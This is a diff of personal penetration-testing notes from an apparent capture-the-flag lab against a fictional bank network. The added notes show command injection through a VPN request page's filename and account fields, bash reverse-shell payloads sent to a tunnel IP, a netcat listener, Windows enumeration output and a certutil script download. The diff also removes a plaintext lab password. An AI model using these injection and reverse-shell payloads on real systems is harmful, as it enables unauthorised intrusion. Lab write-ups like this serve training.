@@ -13,6 +13,8 @@ stabilitythroughcurrency
 SSH IP
 10.200.116.250
 
+Check my Creds in Kali
+
 add:  http://swift.bank.thereserve.loc/ in etc/hosts with Web Server IP
 
  
@@ -25,11 +27,7 @@ add:  http://swift.bank.thereserve.loc/ in etc/hosts with Web Server IP
     Please take note of the following details and please make sure to save them, as they will not be displayed again.
     =======================================
 
-    Username: pitchblack
-    Password: y__vMnjBuo_DhNrR
-    MailAddr: pitchblack@corp.th3reserve.loc
-    IP Range: 10.200.116.0/24
-
+    
   
 
  
@@ -140,6 +138,23 @@ add:  http://swift.bank.thereserve.loc/ in etc/hosts with Web Server IP
             In the Openvpn corpUsername.com we found:
                 10.200.116.21
                 10.200.116.22
+
+
+        Exploit VPN Machine:
+            in the VPN Page via BurpSuite: 
+            http://10.200.116.12/vpncontrol.php we will try to modify the url and get a remote shell:
+                pentenst monkey reverse shell -> bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+            We will add the reverse shell here:
+                GET /requestvpn.php?filename=test HTTP/1.1
+                test && /bin/bash -i >& /dev/tcp/<Tunnel IP>443 0>&1
+
+            We use the repeater in Burp Suite:
+                We finally get a reverse shell and we found DB creds
+
+            Easiest way we add the payload in the from:
+                Account: test && /bin/bash -i >& /dev/tcp/<Tunnel IP>/443 0>&1
+                nc -lvnp 443
 
 
     -Internal Network IP 10.200.116.21:
@@ -277,8 +292,64 @@ add:  http://swift.bank.thereserve.loc/ in etc/hosts with Web Server IP
             SMB         10.200.116.22   445    WRK2             IPC$            READ            Remote IPC
 
 
-    We have RDP session enabled via 'remmina' - domain: corp.thereserve.loc
-
+    We have RDP session enabled via 'remmina' - domain: corp.thereserve.locFlag1 - Flag-1: Breaching the Perimeter + Flag 2: Breaching Active Directory
+    We can use the creds of the two USERS that we discovered to get access to the VPN portal and get VPN config
     
+        RDP Windows Enumeration:
+            systeminfo:
+                machien name: WRK1
+                version: Microsoft Windows Server 2019 Datacenter
+                domain: corp.thereserve.loc
+                
+                Get current username
+                    echo %USERNAME% || whoami <-- L.W
+                    $env:username
+                List user privilege
+                    whoami /priv
+                        SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+                        SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 
-        
+                    whoami /groups
+
+
+                List all users
+                net user
+                    Administrator            Cool101                  DefaultAccount
+                    Guest                    HelpDesk                 john
+                    sshd                     THMSetup                 WDAGUtilityAccount
+
+                whoami /all
+                    List all above
+
+                Get-LocalUser | ft Name,Enabled,LastLogon
+                Get-ChildItem C:\Users -Force | select Name
+
+
+                List Network
+                ipconfig /all
+                    DNS server: 10.200.116.100
+
+                List all current connections
+                netstat -ano
+
+                List all network shares
+                net share
+                    loot$        C:\Users\Administrator\Documents
+
+            
+            Download scripts:
+                in C:\Users\Public certutil -urlcache -f http://<IP>:8080/PrivescCheck.ps1 PrivescCheck.ps1
+
+                We found a pssibility with "Unquoted Service File"
+
+    We have the flag 1 - Flag-1: Breaching the Perimeter + Flag 2: Breaching Active Directory
+
+
+
+    VPN_User_Config:
+        From this page "http://10.200.116.12/vpncontrol.php"
+        We have been able to download all the users VPN config
+        We can generate a VPN config with any user even if not in domain
+
+    in the VPN Page via BurpSuite: 
+        http://10.200.116.12/vpncontrol.php we will try to modify the url and get a remote shell 
